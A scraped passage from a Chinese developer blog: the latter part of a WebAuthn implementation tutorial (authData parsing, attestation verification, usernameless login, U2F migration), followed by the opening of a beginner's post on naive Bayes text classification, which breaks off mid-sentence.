会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话...</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成...</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 